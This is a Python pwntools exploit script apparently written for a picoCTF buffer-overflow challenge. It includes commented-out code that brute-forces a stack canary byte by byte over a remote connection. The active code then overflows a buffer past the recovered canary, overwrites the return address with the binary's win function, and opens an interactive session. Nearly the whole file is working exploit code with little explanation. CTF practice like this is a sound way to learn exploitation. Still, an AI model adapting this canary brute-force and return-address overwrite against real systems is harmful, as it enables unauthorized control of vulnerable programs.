from pwn import *
import string

charset = string.printable

context.log_level = "Error"
elf = ELF("./vuln")

# ===================================================================
# CODE TO BRUTE FORCE CANARY VALUE ON REMOTE SERVER

# canary = b""
# input_len = 65
# size = 65

# for count in range(0, 4):
#     for i in range(101):
#         io = remote("saturn.picoctf.net", 63801)
#         # io = process("./vuln")
#         print(i)
#         io.sendline(str(input_len).encode())
#         payload = b"A" * 64
#         payload += canary + charset[i].encode()

#         io.sendline(payload)
#         io.recvline()

#         output = io.recvline()
#         if b"Stack Smashing Detected" not in output:
#             print(charset[i])
#             canary += charset[i].encode()
#             input_len += 1
#             break
#         io.close()
# print("canary : ", canary)

canary = b"BiRd"

io = remote("saturn.picoctf.net", 63801)
# io = process("./vuln")

io.sendline(b"92")
payload = b"A" * 64
payload += canary
payload += b"B" * 16
payload += p32(elf.sym.win)

io.sendline(payload)
io.interactive()
